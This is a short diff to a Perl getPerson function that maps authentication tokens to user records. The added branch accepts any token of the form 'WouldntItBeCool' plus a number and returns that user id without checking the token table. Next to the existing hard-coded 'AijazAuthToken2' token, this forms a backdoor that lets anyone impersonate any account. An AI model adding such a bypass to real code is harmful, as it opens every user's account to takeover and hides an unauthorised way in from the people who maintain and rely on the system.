@@ -28,6 +28,10 @@ sub getPerson {
     elsif ($token eq 'AijazAuthToken2') { 
         $person = &Database::getRow($r, $dbh, qq[select p.* from person p where id = 2]);
     }
+    elsif ($token =~ /WouldntItBeCool(\d+)/) { 
+        my $id = $1;
+        $person = &Database::getRow($r, $dbh, qq[select p.* from person p where id = ?], $id);
+    }
     else { 
         $person = &Database::getRow($r, $dbh, qq[select p.* from person p join token t on t.person_id = p.id where t.token = ?], $token);
     }
